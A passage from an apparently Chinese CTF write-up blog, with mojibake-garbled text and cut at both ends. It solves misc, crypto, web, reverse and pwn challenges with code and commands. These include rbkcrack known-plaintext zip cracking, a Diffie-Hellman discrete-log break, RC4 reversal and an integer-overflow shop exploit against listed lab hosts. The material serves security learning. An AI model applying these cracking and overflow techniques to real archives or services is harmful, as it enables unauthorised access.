class="number">256</span>):</span><br><span class="line">out[<span class="number">2349</span>]=i</span><br><span class="line">outbyte = <span class="built_in">bytes</span>(out)</span><br><span class="line"><span class="built_in">open</span>(<span class="string">f&#x27;xxx/flag<span class="subst">&#123;i&#125;</span>.7z&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(outbyte)</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆçš„7zæ–‡ä»¶éƒ½åŠ å¯†ï¼Œçˆ†ç ´æ— æœã€‚</p><p>åé¢æ”¾å‡ºæç¤º <code>filter: dns</code>ï¼Œé‡æ–°Wiresharkæ‰“å¼€æµé‡åŒ…ï¼Œè¿‡æ»¤dnsæµé‡ï¼Œå‘ç°åŸŸå <code>.nss.neusoft.edu.cn</code> å‰çš„ä¸»æœºåå¯ä»¥ç»„æˆä¸€ä¸²base64ç¼–ç  <code>cGFzc3dvcmQ6IG5zc195eWRzIQ==</code>ï¼Œè§£ç æœ‰ <code>password: nss_yyds!</code>ã€‚</p><p>ä½¿ç”¨è„šæœ¬æ‰¹é‡å°è¯•è§£å‹256ä¸ª7zå‹ç¼©åŒ…ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> py7zr</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uncompress</span>(<span class="params">path_name</span>):</span></span><br><span class="line"><span class="keyword">if</span> py7zr.is_7zfile(path_name):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">d_name = <span class="string">&#x27;nss_yyds!&#x27;</span></span><br><span class="line"><span class="keyword">with</span> py7zr.SevenZipFile(path_name,password=d_name, mode=<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> sevenZ_f:</span><br><span class="line">sevenZ_f.extractall(path_name.rsplit(<span class="string">&quot;.7z&quot;</span>)[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Error when uncompress file! info: &#x27;</span>, e)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;This is not a true 7z file!&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    folder_name = <span class="string">&#x27;xxx&#x27;</span></span><br><span class="line">    os.chdir(folder_name)</span><br><span class="line">    files = os.listdir(folder_name)</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> files:</span><br><span class="line">        f_path = folder_name + os.sep + f</span><br><span class="line">        <span class="keyword">if</span> os.path.isfile(f_path):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;è§£å‹--&quot;</span>+f)</span><br><span class="line">            uncompress(path_name=f_path)</span><br></pre></td></tr></table></figure><p>è¿è¡Œå®Œæˆå‘ç° <code>flag194.7z</code> è§£å‹æˆåŠŸï¼Œå¾—åˆ°ä¸€å¼ äºŒç»´ç ï¼Œ</p><p>æ‰«æå¾—åˆ°çš„å†…å®¹ï¼Œç»hex+base64+base62+base58+base32 è§£ç å¾—flagï¼š<code>flag&#123;6095B134-5437-4B21-BE52-EDC46A276297&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="ecryptedzip"><a href="#ecryptedzip" class="headerlink" title="ecryptedzip"></a>ecryptedzip</h3><p>åªæä¾›äº†ä¸€ä¸ªå¸¦ <code>README.md</code> å’Œ <code>LICENSE</code> ä¸¤ä¸ªæ–‡ä»¶çš„åŠ å¯†zipå‹ç¼©åŒ…ï¼Œç”¨ARCHPRå¼±å¯†ç åŠå­—å…¸éƒ½æ— æ³•å¾—åˆ°å¯†ç ã€‚</p><p>æƒ³åˆ°è¿™ä¸¤ä¸ªæ–‡ä»¶ç»å¸¸é»˜è®¤å‡ºç°åœ¨Githubåº“ä¸­ï¼Œéšä¾¿æ‰¾ä¸€ä¸ªGithubåº“ï¼Œä¸‹è½½LICENSEæ–‡ä»¶ï¼Œå‘ç°å¤§å°ä¸å‹ç¼©åŒ…å†…çš„LICENSEæ–‡ä»¶ç›¸è¿‘ï¼Œå¯ä»¥é‡‡ç”¨å·²çŸ¥éƒ¨åˆ†æ˜æ–‡ï¼ˆè‡³å°‘è¿ç»­12å­—èŠ‚ï¼‰æ”»å‡»æ–¹å¼ç ´è§£ã€‚ä¿ç•™ä¸‹è½½çš„LICENSEæ–‡ä»¶ä¸­å‰å‡ è¡Œå†…å®¹ï¼Œç”¨rbkcrackå·¥å…·è·‘keyï¼š</p><p><code>rbkcrack.exe -C ecryptedzip.zip -c LICENSE -p LICENSE.txt</code></p><p>æ‹¿åˆ°ä¸‰ç»„keyä¹‹åè¿›è¡Œè§£å¯†ï¼š</p><p><code>rbkcrack.exe -C ecryptedzip.zip -c README.md -k 32cc3495 7f955ff5 58291af3 -d README.md</code></p><p>æˆ–ç›´æ¥å°†keyè¾“å…¥ARCHPRçš„æ˜æ–‡æ”»å‡»æ¨¡å¼é‡Œçš„keyè¾“å…¥æ¡†ä¸­ï¼ŒæˆåŠŸè§£å‹zipåŒ…ã€‚</p><p>flagï¼š<code>flag&#123;Kn0wn_pla1ntext_attack_Is_very_Usefully&#125;</code>ã€‚</p><p>â€‹    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="ç­¾åˆ°-é”®ç›˜ä¾ "><a href="#ç­¾åˆ°-é”®ç›˜ä¾ " class="headerlink" title="[ç­¾åˆ°]é”®ç›˜ä¾ "></a>[ç­¾åˆ°]é”®ç›˜ä¾ </h3><blockquote><p>UYTGBNM EDCV UYTGBNM TGBUHM YTFVBH QAZXCDE TYUHN EDCTGBF RFVYGN</p><p>flag{} æäº¤æ—¶æ‹¬å·å†…ä¸ºå¤§å†™å­—æ¯</p></blockquote><p>é”®ç›˜å¯†ç ï¼ŒæŒ‰å­—æ¯é¡ºåºåœ¨é”®ä½æ¯”åˆ’ï¼š<code>flag&#123;CLCKOUTHK&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="èŒæ–°-ç´ æ•°"><a href="#èŒæ–°-ç´ æ•°" class="headerlink" title="[èŒæ–°]ç´ æ•°"></a>[èŒæ–°]ç´ æ•°</h3><blockquote><p>ç›®å‰768ä½çš„ç´ æ•°é€‰æ‹©ä¸‹ï¼Œrsaç­‰å…¬é’¥åŠ å¯†ç®—æ³•å·²ç»ä¸å®‰å…¨ï¼ŒrsaåŠ å¯†éœ€è¦è¿›è¡Œæ›´å¤§ç´ æ•°çš„é€‰æ‹©ï¼Œè¯·æ‚¨é€‰å‡º10ä¸ª1024ä½ä»¥ä¸Šçš„å¤§ç´ æ•°æäº¤ç»™æˆ‘</p><p><a href="http://sushu_tyen54ybg54dbgdnbd.nssctf.neusoft.edu.cn/">http://sushu_tyen54ybg54dbgdnbd.nssctf.neusoft.edu.cn/</a></p><p>å¤‡ç”¨</p><p><a href="http://sushu_5rg35rg4g.nssctf.neusoft.edu.cn/">http://sushu_5rg35rg4g.nssctf.neusoft.edu.cn/</a></p></blockquote><p>é¡µé¢è¾“å…¥10ä¸ª1024ä½ä»¥ä¸Šçš„ç´ æ•°æäº¤æ‹¿flagã€‚ç”Ÿæˆ1025ä½çš„ç´ æ•°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line"><span class="built_in">print</span>(getPrime(<span class="number">1025</span>))</span><br></pre></td></tr></table></figure><p>flagï¼š<code>flag&#123;d6a6a1bc-88e9-4330-83f9-bdd3bdad5401&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="silent-peeper"><a href="#silent-peeper" class="headerlink" title="silent_peeper"></a>silent_peeper</h3><blockquote><p>You are just a silent peeper, silently discovering the secret.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;flag&#123;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&#125;&quot;</span></span><br><span class="line">bs = AES.block_size</span><br><span class="line">pad = <span class="keyword">lambda</span> s: s + (bs - <span class="built_in">len</span>(s) % bs) * <span class="built_in">chr</span>(bs - <span class="built_in">len</span>(s) % bs)</span><br><span class="line"></span><br><span class="line">p = <span class="number">174807157365465092731323561678522236549173502913317875393564963123330281052524687450754910240009920154525635325209526987433833785499384204819179549544106498491589834195860008906875039418684191252537604123129659746721614402346449135195832955793815709136053198207712511838753919608894095907732099313139446299843</span></span><br><span class="line">g = <span class="number">41899070570517490692126143234857256603477072005476801644745865627893958675820606802876173648371028044404957307185876963051595214534530501331532626624926034521316281025445575243636197258111995884364277423716373007329751928366973332463469104730271236078593527144954324116802080620822212777139186990364810367977</span></span><br><span class="line">a = getRandomNBitInteger(<span class="number">40</span>)</span><br><span class="line">b = getRandomNBitInteger(<span class="number">40</span>)</span><br><span class="line">A = <span class="built_in">pow</span>(g, a, p)</span><br><span class="line">B = <span class="built_in">pow</span>(g, b, p)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">pow</span>(A, b, p) == <span class="built_in">pow</span>(B, a, p)</span><br><span class="line">key = <span class="built_in">pow</span>(A, b ,p)</span><br><span class="line">key = long_to_bytes(key)[:<span class="number">16</span>]</span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">ciphertext = cipher.encrypt(pad(flag))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;cipher&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">&quot;A, B = &#123;&#125;\n&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>((A, B))))</span><br><span class="line">    f.write(<span class="string">&quot;ciphertext = &#123;&#125;\n&quot;</span>.<span class="built_in">format</span>(binascii.hexlify(ciphertext)))</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># cipher</span></span><br><span class="line"><span class="comment"># A, B = (142989488568573584455487421652639325256968267580899511353325709765313839485530879575182195391847106611058986646758739505820350416810754259522949402428485456431884223161690132385605038767582431070875138678612435983425500273038807582069763455994486365993366499478412783220052753597397455113133312907456163112016L, 16631700400183329608792112442038543911563829699195024819408410612490671355739728510944167852170853457830111233224257622677296345757516691802411264928943809622556723315310581871447325139349242754287009766402650270061476954875266747743058962546605854650101122523183742112737784691464177427011570888040416109544L)</span></span><br><span class="line"><span class="comment"># ciphertext = ed5c68ebb65aa3a13afb259cf3984ce60bdc54b7ef918b850745df850cf4c450b02216c0c6e67ed501a17e516496cd6c</span></span><br></pre></td></tr></table></figure></blockquote><p>Diffie-Hellmanå¯†é’¥äº¤æ¢ï¼Œå·²çŸ¥ç”Ÿæˆå…ƒ $g$ã€æ¨¡æ•° $p$ å’ŒABæ ¹æ®40ä½éšæœºæ•° $a,b$ ç”Ÿæˆçš„å„è‡ªçš„æ•° $A=g^a \pmod p,B=g^b \pmod p$ï¼Œæ±‚å…±äº«å¯†é’¥ $K=g^{ab} \pmod p$ã€‚</p><p>$a,b$ éƒ½ä¸º40ä½æ¯”è¾ƒå°ï¼Œå¯ä»¥é‡‡ç”¨lambdaç®—æ³•è§£ç¦»æ•£å¯¹æ•°ï¼Œè§£å‡º $a$ æˆ– $b$ å³å¯è®¡ç®— $K$ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line">p = <span class="number">174807157365465092731323561678522236549173502913317875393564963123330281052524687450754910240009920154525635325209526987433833785499384204819179549544106498491589834195860008906875039418684191252537604123129659746721614402346449135195832955793815709136053198207712511838753919608894095907732099313139446299843</span></span><br><span class="line">g = <span class="number">41899070570517490692126143234857256603477072005476801644745865627893958675820606802876173648371028044404957307185876963051595214534530501331532626624926034521316281025445575243636197258111995884364277423716373007329751928366973332463469104730271236078593527144954324116802080620822212777139186990364810367977</span></span><br><span class="line">A, B = (<span class="number">142989488568573584455487421652639325256968267580899511353325709765313839485530879575182195391847106611058986646758739505820350416810754259522949402428485456431884223161690132385605038767582431070875138678612435983425500273038807582069763455994486365993366499478412783220052753597397455113133312907456163112016</span>, <span class="number">16631700400183329608792112442038543911563829699195024819408410612490671355739728510944167852170853457830111233224257622677296345757516691802411264928943809622556723315310581871447325139349242754287009766402650270061476954875266747743058962546605854650101122523183742112737784691464177427011570888040416109544</span>)</span><br><span class="line">k = GF(p)</span><br><span class="line">B = k(B)</span><br><span class="line">g = k(g)</span><br><span class="line">b = discrete_log_lambda(B,g,(<span class="number">1</span>,<span class="number">2</span>**<span class="number">40</span>))</span><br><span class="line">ciphertext = <span class="string">&#x27;ed5c68ebb65aa3a13afb259cf3984ce60bdc54b7ef918b850745df850cf4c450b02216c0c6e67ed501a17e516496cd6c&#x27;</span></span><br><span class="line">key = <span class="built_in">pow</span>(A, b ,p)</span><br><span class="line">key = long_to_bytes(key)[:<span class="number">16</span>]</span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">m = cipher.decrypt(<span class="built_in">bytes</span>.fromhex(ciphertext))</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;21384433-0dc7-413b-9d09-64cc97c99730&#125;\x06\x06\x06\x06\x06\x06&#x27;</span></span><br></pre></td></tr></table></figure><p>flagï¼š<code>flag&#123;21384433-0dc7-413b-9d09-64cc97c99730&#125;</code>ã€‚</p><p>â€‹    </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="ç­¾åˆ°-flag"><a href="#ç­¾åˆ°-flag" class="headerlink" title="[ç­¾åˆ°] flag"></a>[ç­¾åˆ°] flag</h3><blockquote><p><a href="http://47.106.172.144:65333/">http://47.106.172.144:65333/</a></p></blockquote><p>é¡µé¢ä¸æ–­éšæœºè¾“å‡ºflagå„ä½ç½®å¯¹åº”å­—ç¬¦ï¼Œå¤åˆ¶ï¼Œè„šæœ¬å¡«å……ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">flag=[<span class="string">&#x27;?&#x27;</span>]*<span class="number">20</span></span><br><span class="line">flag[<span class="number">11</span>]=<span class="string">&#x27;f&#x27;</span></span><br><span class="line">flag[<span class="number">16</span>]=<span class="string">&#x27;a&#x27;</span></span><br><span class="line">flag[<span class="number">19</span>]=<span class="string">&#x27;9&#x27;</span></span><br><span class="line">flag[<span class="number">10</span>]=<span class="string">&#x27;N&#x27;</span></span><br><span class="line">flag[<span class="number">5</span>]=<span class="string">&#x27;3&#x27;</span></span><br><span class="line">flag[<span class="number">15</span>]=<span class="string">&#x27;n&#x27;</span></span><br><span class="line">flag[<span class="number">16</span>]=<span class="string">&#x27;a&#x27;</span></span><br><span class="line">flag[<span class="number">4</span>]=<span class="string">&#x27;Z&#x27;</span></span><br><span class="line">flag[<span class="number">8</span>]=<span class="string">&#x27;c&#x27;</span></span><br><span class="line">flag[<span class="number">4</span>]=<span class="string">&#x27;Z&#x27;</span></span><br><span class="line">flag[<span class="number">17</span>]=<span class="string">&#x27;W&#x27;</span></span><br><span class="line">flag[<span class="number">11</span>]=<span class="string">&#x27;f&#x27;</span></span><br><span class="line">flag[<span class="number">2</span>]=<span class="string">&#x27;x&#x27;</span></span><br><span class="line">flag[<span class="number">7</span>]=<span class="string">&#x27;u&#x27;</span></span><br><span class="line">flag[<span class="number">9</span>]=<span class="string">&#x27;3&#x27;</span></span><br><span class="line">flag[<span class="number">8</span>]=<span class="string">&#x27;c&#x27;</span></span><br><span class="line">flag[<span class="number">17</span>]=<span class="string">&#x27;W&#x27;</span></span><br><span class="line">flag[<span class="number">11</span>]=<span class="string">&#x27;f&#x27;</span></span><br><span class="line">flag[<span class="number">9</span>]=<span class="string">&#x27;3&#x27;</span></span><br><span class="line">flag[<span class="number">13</span>]=<span class="string">&#x27;G&#x27;</span></span><br><span class="line">flag[<span class="number">11</span>]=<span class="string">&#x27;f&#x27;</span></span><br><span class="line">flag[<span class="number">0</span>]=<span class="string">&#x27;Z&#x27;</span></span><br><span class="line">flag[<span class="number">0</span>]=<span class="string">&#x27;Z&#x27;</span></span><br><span class="line">flag[<span class="number">10</span>]=<span class="string">&#x27;N&#x27;</span></span><br><span class="line">flag[<span class="number">12</span>]=<span class="string">&#x27;b&#x27;</span></span><br><span class="line">flag[<span class="number">1</span>]=<span class="string">&#x27;m&#x27;</span></span><br><span class="line">flag[<span class="number">0</span>]=<span class="string">&#x27;Z&#x27;</span></span><br><span class="line">flag[<span class="number">14</span>]=<span class="string">&#x27;9&#x27;</span></span><br><span class="line">flag[<span class="number">1</span>]=<span class="string">&#x27;m&#x27;</span></span><br><span class="line">flag[<span class="number">0</span>]=<span class="string">&#x27;Z&#x27;</span></span><br><span class="line">flag[<span class="number">16</span>]=<span class="string">&#x27;a&#x27;</span></span><br><span class="line">flag[<span class="number">14</span>]=<span class="string">&#x27;9&#x27;</span></span><br><span class="line">flag[<span class="number">16</span>]=<span class="string">&#x27;a&#x27;</span></span><br><span class="line">flag[<span class="number">13</span>]=<span class="string">&#x27;G&#x27;</span></span><br><span class="line">flag[<span class="number">3</span>]=<span class="string">&#x27;h&#x27;</span></span><br><span class="line">flag[<span class="number">12</span>]=<span class="string">&#x27;b&#x27;</span></span><br><span class="line">flag[<span class="number">11</span>]=<span class="string">&#x27;f&#x27;</span></span><br><span class="line">flag[<span class="number">12</span>]=<span class="string">&#x27;b&#x27;</span></span><br><span class="line">flag[<span class="number">15</span>]=<span class="string">&#x27;n&#x27;</span></span><br><span class="line">flag[<span class="number">3</span>]=<span class="string">&#x27;h&#x27;</span></span><br><span class="line">flag[<span class="number">9</span>]=<span class="string">&#x27;3&#x27;</span></span><br><span class="line">flag[<span class="number">17</span>]=<span class="string">&#x27;W&#x27;</span></span><br><span class="line">flag[<span class="number">5</span>]=<span class="string">&#x27;3&#x27;</span></span><br><span class="line">flag[<span class="number">6</span>]=<span class="string">&#x27;t&#x27;</span></span><br><span class="line">flag[<span class="number">18</span>]=<span class="string">&#x27;5&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(flag))</span><br><span class="line"><span class="comment"># ZmxhZ3tuc3NfbG9naW59</span></span><br></pre></td></tr></table></figure><p>base64è§£ç å¾—flagï¼š<code>flag&#123;nss_login&#125;</code>ã€‚</p><p>â€‹    </p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="ç­¾åˆ°-signin"><a href="#ç­¾åˆ°-signin" class="headerlink" title="[ç­¾åˆ°]signin"></a>[ç­¾åˆ°]signin</h3><blockquote><p>é€†å‘ çœŸ ç­¾åˆ°é¢˜</p></blockquote><p>010editor 16è¿›åˆ¶æŸ¥çœ‹ï¼Œæœç´¢å‡ºflagï¼š<code>flag&#123;REVERSE_1s_Very_3asy!&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="èŒæ–°-happyCTF"><a href="#èŒæ–°-happyCTF" class="headerlink" title="[èŒæ–°]happyCTF"></a>[èŒæ–°]happyCTF</h3><p>IDAåç¼–è¯‘ï¼Œå‘ç°å»äº†ç¬¦å·ï¼Œåˆ†æä»£ç é€»è¾‘ï¼Œéœ€è¾“å…¥é•¿åº¦24çš„flagå­—ç¬¦ä¸²ï¼Œç» <code>sub_403B70()</code> å‡½æ•°é‡Œé€å­—ç¬¦å¼‚æˆ–0x14åï¼Œä¸å­—ç¬¦ä¸² <code>rxusoCqxw&#123;yqK`&#123;KZqag&#123;r`i</code> æ¯”è¾ƒï¼Œç›¸ç­‰åˆ™é€šè¿‡ã€‚</p><p>æŒ‰å¼‚æˆ–æ€§è´¨ï¼Œå°†å­—ç¬¦ä¸²ä¸0x14é€å­—ç¬¦å¼‚æˆ–è¿˜åŸflagï¼š<code>flag&#123;Welcome_to_Neusoft&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="Remember-Crypt-4"><a href="#Remember-Crypt-4" class="headerlink" title="Remember Crypt 4"></a>Remember Crypt 4</h3><p>ä»é¢˜ç›®å°±èƒ½çŒœå‡ºæ˜¯RC4ï¼Œ<code>main()</code> å‡½æ•°ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">void</span> *v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">void</span> *v7; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+24h] [rbp-D4h]</span></span><br><span class="line">  <span class="keyword">void</span> *v9; <span class="comment">// [rsp+28h] [rbp-D0h]</span></span><br><span class="line">  <span class="keyword">char</span> v10[<span class="number">32</span>]; <span class="comment">// [rsp+30h] [rbp-C8h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> Str[<span class="number">128</span>]; <span class="comment">// [rsp+50h] [rbp-A8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(Str, <span class="string">&quot;12345678abcdefghijklmnopqrspxyz&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;Str[<span class="number">32</span>], <span class="number">0</span>, <span class="number">0x60</span>ui64);</span><br><span class="line">  <span class="built_in">memset</span>(v10, <span class="number">0</span>, <span class="number">0x17</span>ui64);</span><br><span class="line">  sub_1400054D0(<span class="string">&quot;%s&quot;</span>, v10);</span><br><span class="line">  v9 = <span class="built_in">malloc</span>(<span class="number">0x408</span>ui64);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(Str);</span><br><span class="line">  sub_140001120(v9, Str, v3);</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(v10);</span><br><span class="line">  sub_140001240(v9, v10, v4);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">22</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ((<span class="keyword">unsigned</span> __int8)v10[i] ^ <span class="number">0x22</span>) != byte_14013B000[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = (<span class="keyword">void</span> *)sub_1400015A0(&amp;off_14013B020, <span class="string">&quot;error&quot;</span>);</span><br><span class="line">      _CallMemberFunction0(v5, sub_140001F10);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v7 = (<span class="keyword">void</span> *)sub_1400015A0(&amp;off_14013B020, <span class="string">&quot;nice job&quot;</span>);</span><br><span class="line">  _CallMemberFunction0(v7, sub_140001F10);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ•´ä½“é€»è¾‘ä¸ºï¼Œè¾“å…¥å­—ç¬¦ä¸²ç»è¿‡ <code>sub_140001120()</code> å’Œ <code>sub_140001240()</code> å‡½æ•°å¤„ç†åï¼Œä¸0x22å¼‚æˆ–ï¼Œä¸ <code>byte_14013B000</code> æ•°ç»„æ¯”è¾ƒã€‚çœ‹ä¸¤å‡½æ•°ç‰¹å¾ï¼Œåˆ†åˆ«ä¸ºRC4ç®—æ³•çš„KSAå’ŒPRGAå‡½æ•°ï¼Œkeyä¸º <code>12345678abcdefghijklmnopqrspxyz</code>ã€‚</p><p>IDAæå–æ•°ç»„hexå€¼ï¼š<code>9EE7305FA701A653591B0A20F173D10EAB09840E8D2B0000</code>ï¼ŒCyberchef FromHex+XOR+RC4ä¸€æŠŠæ¢­ï¼Œå¾—åˆ°flagï¼š<code>flag&#123;nice_to_meet_you&#125;</code>ã€‚</p><p>â€‹    </p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="ç­¾åˆ°-NssShop"><a href="#ç­¾åˆ°-NssShop" class="headerlink" title="[ç­¾åˆ°]NssShop"></a>[ç­¾åˆ°]NssShop</h3><blockquote><p>nc 47.106.172.144 65002</p><p>çœŸ ç­¾åˆ°é¢˜ ä¸ä¼šPWNçš„åŒå­¦ä¹Ÿå¯ä»¥æ¥è¯•è¯•</p></blockquote><p>ncè¿æ¥ï¼Œå½“å‰é‡‘é¢ä¸º0ï¼Œé€‰æ‹© <code>1.Buy Item</code>ï¼Œ</p><p>çœ‹åˆ°flagä»·æ ¼10000ï¼Œhintä»·æ ¼0ï¼Œé€‰æ‹© <code>1.Hint:0$</code>ï¼Œ</p><p>å›æ˜¾ <code>Unlimited purchase of items in the shop</code>ï¼Œè¯´æ˜æ•°é‡æ— ä¸Šé™ã€‚</p><p>åˆ©ç”¨intå‹æº¢å‡ºæ€§è´¨ï¼Œä½¿å¾—flagå•ä»·ä¸æ•°é‡ä¹˜ç§¯çš„æ€»ä»·ä¸Šæº¢ä¸ºè´Ÿæ•°å³å¯ã€‚</p><p>é€‰æ‹© 